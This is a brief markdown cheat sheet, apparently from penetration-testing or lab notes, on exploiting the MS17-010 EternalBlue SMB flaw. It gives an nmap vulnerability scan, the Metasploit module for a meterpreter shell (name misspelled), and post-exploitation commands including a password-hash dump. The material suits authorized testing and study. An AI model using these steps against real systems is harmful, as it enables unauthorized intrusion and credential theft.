# smb-vuln-ms17-010 | CVE-2017-0143 | EternalBlue

## Metasploit

1. Check if target is vulnerable
   
        nmap --script vuln -p 137,139,445 10.10.10.4

2. Use Metasploit module `windows/smb/ms17_010_eternablue` to obtain **meterpreter** shell access

        getuid
        run post/windows/gather/hashdump
        ipconfig

## References

* https://www.lmgsecurity.com/manually-exploiting-ms17-010/